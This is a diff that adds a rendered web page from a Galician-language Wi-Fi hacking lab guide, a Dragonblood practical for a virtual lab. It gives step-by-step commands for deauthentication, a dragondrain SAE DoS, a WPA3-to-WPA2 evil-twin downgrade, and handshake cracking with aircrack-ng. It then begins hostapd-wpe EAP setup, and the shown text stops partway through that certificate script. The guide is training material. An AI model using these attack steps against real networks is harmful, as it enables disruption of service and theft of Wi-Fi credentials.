+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Táboa de contidos">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Táboa de contidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-preparacion-do-escenario-terminais-1-e-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. Preparación do Escenario (Terminais 1 e 2)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-reconecemento-e-modo-monitor-terminais-1-e-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. Recoñecemento e Modo Monitor (Terminais 1 e 2)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-captura-e-intento-de-deauth-terminal-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      3. Captura e Intento de Deauth (Terminal 1)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-ataque-dos-con-dragondrain-terminal-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      4. Ataque DoS con Dragondrain (Terminal 2)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4. Ataque DoS con Dragondrain (Terminal 2)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#simulacion-da-caida-do-ap-pdf-pax-13-terminal-3" class="md-nav__link">
+    <span class="md-ellipsis">
+      Simulación da caída do AP (PDF: páx. 13) (Terminal 3)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-reconexion-do-cliente-ao-evil-twin-terminal-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      5. Reconexión do Cliente ao Evil Twin (Terminal 2)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-cracking-do-handshake-terminal-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      6. Cracking do Handshake (Terminal 1)
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6b-variante-avanzada-evil-twin-wpa2-eap-jtrhashcat" class="md-nav__link">
+    <span class="md-ellipsis">
+      6b. Variante avanzada: Evil Twin WPA2-EAP + jtr/hashcat
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6b. Variante avanzada: Evil Twin WPA2-EAP + jtr/hashcat">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#paso-1-parar-o-evil-twin-psk-terminal-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 1: Parar o Evil Twin PSK (Terminal 2)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-2-verificar-e-preparar-certificados-hostapd-wpe-terminal-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 2: Verificar e preparar certificados hostapd-wpe (Terminal 2)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-3-preparar-wlan2-e-crear-configuracion-hostapd-wpe-terminal-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 3: Preparar wlan2 e crear configuración hostapd-wpe (Terminal 2)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-4-lanzar-hostapd-wpe-terminal-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 4: Lanzar hostapd-wpe (Terminal 2)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-5-reconectar-o-cliente-ao-evil-twin-wpa2-eap-terminal-3" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 5: Reconectar o cliente ao Evil Twin WPA2-EAP (Terminal 3)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-6-verificar-captura-do-hash-en-hostapd-wpe-terminal-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 6: Verificar captura do hash en hostapd-wpe (Terminal 2)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-7-extraer-o-hash-para-hascat-terminal-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 7: Extraer o hash para hascat (Terminal 1)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-8-crackear-con-hashcat-modo-5500-netntlmv1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 8: Crackear con hashcat (Modo 5500 — NetNTLMv1
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-9-mostrar-o-resultado" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 9: Mostrar o resultado
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#comparativa-de-variantes-evil-twin" class="md-nav__link">
+    <span class="md-ellipsis">
+      Comparativa de variantes Evil Twin
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-resumo-do-ataque-dos-evil-twin-wpa2-pskeap" class="md-nav__link">
+    <span class="md-ellipsis">
+      7. Resumo do Ataque (DoS + Evil Twin WPA2-PSK(EAP))
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8-limpeza" class="md-nav__link">
+    <span class="md-ellipsis">
+      8. Limpeza
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#9-preguntas-de-reflexion" class="md-nav__link">
+    <span class="md-ellipsis">
+      9. Preguntas de reflexión
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#10-comparativa-de-vectores-de-ataque-contra-wpa3-sae" class="md-nav__link">
+    <span class="md-ellipsis">
+      10. Comparativa de vectores de ataque contra WPA3-SAE
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="guia-de-practica-33-dragonblood-dos-evil-twin-wpa2-psk-ou-evil-twin-wpa2-eap">Guía de Práctica 3.3: Dragonblood  — DoS + Evil Twin WPA2-PSK (ou + Evil Twin WPA2-EAP)</h1>
+<div class="admonition important">
+<p class="admonition-title">Baseada na práctica <a href="https://raw.githubusercontent.com/ricardofc/repoEDU-CCbySA/main/HE/Taller/Wi-Fi/3-Taller-HE-Practica-WiFi-3.pdf" target="_blank">3-Taller-HE-Practica-WiFi-3.pdf</a></p>
+</div>
+<h2 id="1-preparacion-do-escenario-terminais-1-e-2">1. Preparación do Escenario (Terminais 1 e 2)</h2>
+<p>Arranca o laboratorio. Desprega automaticamente o AP lexítimo WPA3-SAE vulnerable (<code>wlan0</code>), o cliente en modo transición WPA2/WPA3 (<code>wlan1</code>) e o Evil Twin WPA2-PSK (<code>wlan3</code>). A interface <code>wlan2</code> queda libre para o atacante.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo<span class="w"> </span>wifilabctl<span class="w"> </span>up<span class="w"> </span>wpa3_sae_vulnerable
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>sudo<span class="w"> </span>wifilabctl<span class="w"> </span>status
+</span></code></pre></div>
+<p>Saída esperada:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>NAMESPACE        INTERFACE    ESTADO
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>phy0_wlan0       wlan0        UP       ← AP lexítimo WPA3-SAE (hostapd)
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>phy1_wlan1       wlan1        UP       ← Cliente (wpa_supplicant)
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>mitm_wlan3       wlan3        UP       ← Evil Twin WPA2-PSK (hostapd)
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>(global)         wlan2        LISTO    ← Atacante (monitor + dragondrain)
+</span></code></pre></div>
+<p>Comproba que ambos APs están activos:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>grep<span class="w"> </span><span class="s2">&quot;AP-ENABLED&quot;</span><span class="w"> </span>/home/kali/wifiLab/run/wpa3_sae_vulnerable/hostapd.log
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>grep<span class="w"> </span><span class="s2">&quot;AP-ENABLED&quot;</span><span class="w"> </span>/home/kali/wifiLab/run/wpa3_sae_vulnerable/hostapd_eviltwin.log
+</span></code></pre></div>
+<hr />
+<h2 id="2-reconecemento-e-modo-monitor-terminais-1-e-2">2. Recoñecemento e Modo Monitor (Terminais 1 e 2)</h2>
+<p>Pon <code>wlan2</code> en modo monitor para identificar os dous APs e o cliente.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>yes<span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>airmon-ng<span class="w"> </span>start<span class="w"> </span>wlan2
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>sudo<span class="w"> </span>airodump-ng<span class="w"> </span>wlan2mon
+</span></code></pre></div>
+<p>Debes ver <strong>dous APs</strong> co mesmo SSID <code>EMPRESA-XYZ</code> no canal 6:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>BSSID              ENC   AUTH  ESSID
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>EA:18:30:AA:C3:48  WPA3  SAE   EMPRESA-XYZ   ← AP lexítimo (wlan0)
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>C2:3C:42:4B:62:56  WPA2  PSK   EMPRESA-XYZ   ← Evil Twin  (wlan3)
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>Ctrl+C
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>sudo<span class="w"> </span>airodump-ng<span class="w"> </span>-c<span class="w"> </span><span class="m">6</span><span class="w"> </span>wlan2mon
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="c1"># Espera a ver o cliente(wlan1) autenticado no AP lexítimo (BSSID EA:...)</span>
+</span></code></pre></div>
+<p><em>Anota o </em><em>BSSID do AP lexítimo</em><em> e a </em><em>MAC do cliente</em><em> (sección <code>STATIONS</code>). Preme <code>Ctrl+C</code>.</em></p>
+<hr />
+<h2 id="3-captura-e-intento-de-deauth-terminal-1">3. Captura e Intento de Deauth (Terminal 1)</h2>
+<p>Inicia a captura no canal 6:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>mkdir<span class="w"> </span>-p<span class="w"> </span>capturas
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>sudo<span class="w"> </span>airodump-ng<span class="w"> </span>wlan2mon<span class="w"> </span>-c<span class="w"> </span><span class="m">6</span><span class="w"> </span>-w<span class="w"> </span>capturas/cap
+</span></code></pre></div>
+<p>Nunha <strong>nova terminal (Terminal 2)</strong>, tenta desautenticar o cliente:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>sudo<span class="w"> </span>aireplay-ng<span class="w"> </span>--deauth<span class="w"> </span><span class="m">20</span><span class="w"> </span>-a<span class="w"> </span>&lt;BSSID_AP_LEXITIMO&gt;<span class="w"> </span>-c<span class="w"> </span>&lt;MAC_CLIENTE&gt;<span class="w"> </span>wlan2mon
+</span></code></pre></div>
+<p>Saída esperada (deauth <strong>ignorada</strong> por PMF):</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>09:45:32 Sending 64 directed DeAuth (code 7)...[0| 0ACKs]
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>09:45:33 Sending 64 directed DeAuth (code 7)...[0| 0ACKs]
+</span></code></pre></div>
+<p>O cliente <strong>non se desconecta</strong>: PMF (<code>ieee80211w=1</code>) descarta as tramas de deauth non cifradas. Usamos <strong>dragondrain</strong> para o DoS.</p>
+<hr />
+<h2 id="4-ataque-dos-con-dragondrain-terminal-2">4. Ataque DoS con Dragondrain (Terminal 2)</h2>
+<p><code>dragondrain</code> é unha ferramenta en <strong>C</strong> que satura a CPU do AP con solicitudes SAE Commit falsas.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="nb">cd</span><span class="w"> </span>/opt/dragondrain-and-time
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>sudo<span class="w"> </span>./src/dragondrain<span class="w"> </span>-d<span class="w"> </span>wlan2mon<span class="w"> </span>-a<span class="w"> </span>&lt;BSSID_AP_LEXITIMO&gt;<span class="w"> </span>-c<span class="w"> </span><span class="m">6</span><span class="w"> </span>-i<span class="w"> </span><span class="m">50</span><span class="w"> </span>-r<span class="w"> </span><span class="m">100</span><span class="w"> </span>-n<span class="w"> </span><span class="m">1</span>
+</span></code></pre></div>
+<blockquote>
+<p>⚠️ <strong>Limitación con mac80211_hwsim</strong>: dragondrain require hardware Atheros real para xerar ACKs de MACs spoofed. Neste entorno virtual o DoS é limitado. <strong>Pasa directamente á simulación.</strong></p>
+</blockquote>
+<h3 id="simulacion-da-caida-do-ap-pdf-pax-13-terminal-3">Simulación da caída do AP (PDF: páx. 13) (Terminal 3)</h3>
+<p><strong>Nunha nova terminal</strong>, para <strong>só o hostapd do AP lexítimo</strong> (wlan0), sen tocar o Evil Twin:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>sudo<span class="w"> </span>ip<span class="w"> </span>netns<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>phy0_wlan0<span class="w"> </span>pkill<span class="w"> </span>-f<span class="w"> </span><span class="s2">&quot;hostapd.*hostapd.conf&quot;</span>
+</span></code></pre></div>
+<p>Verifica nos logs que só caeu o AP lexítimo:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">&quot;AP-DISABLED|AP-STA-DISCONNECTED&quot;</span><span class="w"> </span>/home/kali/wifiLab/run/wpa3_sae_vulnerable/hostapd.log<span class="w"> </span><span class="p">|</span><span class="w"> </span>tail<span class="w"> </span>-3
+</span></code></pre></div>
+<p>Saída esperada:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>wlan0: AP-STA-DISCONNECTED 72:95:af:1d:09:59
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>wlan0: AP-DISABLED
+</span></code></pre></div></p>
+<blockquote>
+<p>O Evil Twin (<code>wlan3</code>) <strong>segue activo</strong>. Podes verificalo:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>grep<span class="w"> </span><span class="s2">&quot;AP-ENABLED&quot;</span><span class="w"> </span>/home/kali/wifiLab/run/wpa3_sae_vulnerable/hostapd_eviltwin.log
+</span></code></pre></div></p>
+</blockquote>
+<hr />
+<h2 id="5-reconexion-do-cliente-ao-evil-twin-terminal-2">5. Reconexión do Cliente ao Evil Twin (Terminal 2)</h2>
+<p>Co AP lexítimo caído, o cliente lexítimo intenta conectar co AP Rogue e aparece o handshake. Se non é o caso, forza a reconexión do cliente desde dentro do seu namespace:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>sudo<span class="w"> </span>ip<span class="w"> </span>netns<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>phy1_wlan1<span class="w"> </span>bash
+</span></code></pre></div>
+<p>Dentro do namespace:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>pkill<span class="w"> </span>-f<span class="w"> </span>wpa_supplicant<span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nb">true</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>sleep<span class="w"> </span><span class="m">2</span>
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>wpa_supplicant<span class="w"> </span>-B<span class="w"> </span>-i<span class="w"> </span>wlan1<span class="w"> </span>-c<span class="w"> </span>/home/kali/wifiLab/run/wpa3_sae_vulnerable/wpa_supplicant.conf
+</span></code></pre></div>
+<p>O cliente intentará conectar ao Evil Twin. <strong>Non conectará con éxito</strong> (PSK mismatch: o Evil Twin usa <code>calqueracousa</code>), pero <strong>si enviará o handshake WPA2-PSK</strong>. Verifica:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>iw<span class="w"> </span>dev<span class="w"> </span>wlan1<span class="w"> </span>link
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="c1"># Expected: Not connected.  ← Normal! O handshake foi enviado igualmente.</span>
+</span></code></pre></div>
+<p>Na <strong>Terminal 1</strong> (airodump-ng) deberías ver:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>CH  6 ][ WPA handshake: C2:3C:42:4B:62:56
+</span></code></pre></div>
+<p>Nos logs do Evil Twin podes confirmar o intento:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">&quot;authenticated|PSK-MISMATCH&quot;</span><span class="w"> </span>/home/kali/wifiLab/run/wpa3_sae_vulnerable/hostapd_eviltwin.log<span class="w"> </span><span class="p">|</span><span class="w"> </span>tail<span class="w"> </span>-5
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>wlan3: STA 72:95:af:1d:09:59 IEEE 802.11: authenticated
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>wlan3: STA 72:95:af:1d:09:59 IEEE 802.11: associated (aid 1)
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>wlan3: AP-STA-POSSIBLE-PSK-MISMATCH 72:95:af:1d:09:59
+</span></code></pre></div>
+<p>Preme <code>Ctrl+C</code> na <strong>Terminal 1</strong> para deter airodump-ng.</p>
+<hr />
+<h2 id="6-cracking-do-handshake-terminal-1">6. Cracking do Handshake (Terminal 1)</h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>gunzip<span class="w"> </span>-c<span class="w"> </span>/usr/share/wordlists/rockyou.txt.gz<span class="w"> </span>&gt;<span class="w"> </span>/tmp/rockyou.txt
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>sudo<span class="w"> </span>aircrack-ng<span class="w"> </span>capturas/cap-01.cap<span class="w"> </span>-w<span class="w"> </span>/tmp/rockyou.txt
+</span></code></pre></div>
+<p>Escolle o <strong>Evil Twin</strong> como obxectivo (o que ten <code>1 handshake</code>):</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>   #  BSSID              ESSID         Encryption
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>   1  C2:3C:42:4B:62:56  EMPRESA-XYZ   WPA (1 handshake)   ← escolle 1
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>   2  EA:18:30:AA:C3:48  EMPRESA-XYZ   Unknown
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>Index number of target network ? 1
+</span></code></pre></div>
+<p>Resultado esperado:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>KEY FOUND! [ spongebob19 ]
+</span></code></pre></div>
+<blockquote>
+<p>Se non aparece handshake, repite o paso 5 (pkill + wpa_supplicant) e volve executar <code>aircrack-ng</code>.</p>
+</blockquote>
+<hr />
+<h2 id="6b-variante-avanzada-evil-twin-wpa2-eap-jtrhashcat">6b. Variante avanzada: Evil Twin WPA2-EAP + jtr/hashcat</h2>
+<p>O ataque anterior captura o handshake WPA2-<strong>PSK</strong> e crackéao con aircrack-ng. Existe unha variante máis potente: substituír o Evil Twin WPA2-PSK por un <strong>WPA2-EAP con hostapd-wpe</strong> que captura o <strong>hash MSCHAPv2</strong> directamente — crackeable con <code>jtr|hashcat</code>.</p>
+<blockquote>
+<p>💡 Esta variante aplícase cando a rede lexítima usa WPA3-EAP (non PSK). O cliente en modo transición acepta o downgrade a WPA2-EAP igual que a WPA2-PSK.</p>
+</blockquote>
+<p>Neste escenario, <code>wlan2</code> está libre no namespace global e é a interface que usaremos para o Evil Twin EAP. O Evil Twin WPA2-PSK (<code>wlan3</code> / <code>mitm_wlan3</code>) debe estar <strong>parado</strong> primeiro para evitar conflitos de SSID.</p>
+<hr />
+<h3 id="paso-1-parar-o-evil-twin-psk-terminal-2">Paso 1: Parar o Evil Twin PSK (Terminal 2)</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="c1"># Parar o hostapd do Evil Twin WPA2-PSK para liberar o canal</span>
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>sudo<span class="w"> </span>ip<span class="w"> </span>netns<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>mitm_wlan3<span class="w"> </span>pkill<span class="w"> </span>-f<span class="w"> </span>hostapd
+</span></code></pre></div>
+<hr />
+<h3 id="paso-2-verificar-e-preparar-certificados-hostapd-wpe-terminal-2">Paso 2: Verificar e preparar certificados hostapd-wpe (Terminal 2)</h3>
+<p>O <code>wifilabctl</code> non xera certificados de hostapd-wpe para este escenario (só para <code>eap_evil_twin</code>). Hai que xeralos manualmente.</p>
+<blockquote>
+<p>⚠️ <strong>Causa do erro <code>Problem with index file: .//index.txt (could not load/parse file)</code></strong>: o <code>bootstrap</code> usa <code>openssl ca</code> que busca o índice en <code>demoCA/index.txt</code> (non no directorio raíz). Se <code>demoCA/</code> non ten a estrutura completa con <code>newcerts/</code>, <code>index.txt</code> e <code>serial</code>, o proceso falla. A solución é reconstruír <code>demoCA/</code> desde cero.</p>
+</blockquote>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>sudo<span class="w"> </span>su<span class="w"> </span>-
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="nv">WPE</span><span class="o">=</span>/etc/hostapd-wpe/certs
+</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>
+</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a><span class="c1"># 1. Eliminar certificados e claves anteriores</span>
+</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a>rm<span class="w"> </span>-f<span class="w"> </span><span class="nv">$WPE</span>/server.crt<span class="w">  </span><span class="nv">$WPE</span>/server.csr<span class="w"> </span><span class="nv">$WPE</span>/server.pem<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a><span class="w">      </span><span class="nv">$WPE</span>/server.key<span class="w">  </span><span class="nv">$WPE</span>/server.p12<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a><span class="w">      </span><span class="nv">$WPE</span>/ca.pem<span class="w">      </span><span class="nv">$WPE</span>/ca.key<span class="w">     </span><span class="nv">$WPE</span>/ca.der
+</span><span id="__span-24-9"><a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a>
+</span><span id="__span-24-10"><a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a><span class="c1"># 2. Reconstruír a estrutura demoCA/ que require openssl ca</span>
+</span><span id="__span-24-11"><a id="__codelineno-24-11" name="__codelineno-24-11" href="#__codelineno-24-11"></a>rm<span class="w"> </span>-rf<span class="w"> </span><span class="nv">$WPE</span>/demoCA
+</span><span id="__span-24-12"><a id="__codelineno-24-12" name="__codelineno-24-12" href="#__codelineno-24-12"></a>mkdir<span class="w"> </span>-p<span class="w"> </span><span class="nv">$WPE</span>/demoCA/newcerts
+</span><span id="__span-24-13"><a id="__codelineno-24-13" name="__codelineno-24-13" href="#__codelineno-24-13"></a>mkdir<span class="w"> </span>-p<span class="w"> </span><span class="nv">$WPE</span>/demoCA/private
+</span><span id="__span-24-14"><a id="__codelineno-24-14" name="__codelineno-24-14" href="#__codelineno-24-14"></a>touch<span class="w">    </span><span class="nv">$WPE</span>/demoCA/index.txt
+</span><span id="__span-24-15"><a id="__codelineno-24-15" name="__codelineno-24-15" href="#__codelineno-24-15"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;01&#39;</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nv">$WPE</span>/demoCA/serial
+</span><span id="__span-24-16"><a id="__codelineno-24-16" name="__codelineno-24-16" href="#__codelineno-24-16"></a>
+</span><span id="__span-24-17"><a id="__codelineno-24-17" name="__codelineno-24-17" href="#__codelineno-24-17"></a><span class="c1"># 3. Resetear índice e serial no directorio raíz</span>
+</span><span id="__span-24-18"><a id="__codelineno-24-18" name="__codelineno-24-18" href="#__codelineno-24-18"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;01&#39;</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nv">$WPE</span>/serial
+</span><span id="__span-24-19"><a id="__codelineno-24-19" name="__codelineno-24-19" href="#__codelineno-24-19"></a>touch<span class="w">       </span><span class="nv">$WPE</span>/index.txt
+</span><span id="__span-24-20"><a id="__codelineno-24-20" name="__codelineno-24-20" href="#__codelineno-24-20"></a>rm<span class="w"> </span>-f<span class="w">       </span><span class="nv">$WPE</span>/index.txt.attr<span class="w"> </span><span class="nv">$WPE</span>/index.txt.attr.old<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-24-21"><a id="__codelineno-24-21" name="__codelineno-24-21" href="#__codelineno-24-21"></a><span class="w">            </span><span class="nv">$WPE</span>/index.txt.old<span class="w">  </span><span class="nv">$WPE</span>/serial.old
+</span><span id="__span-24-22"><a id="__codelineno-24-22" name="__codelineno-24-22" href="#__codelineno-24-22"></a>
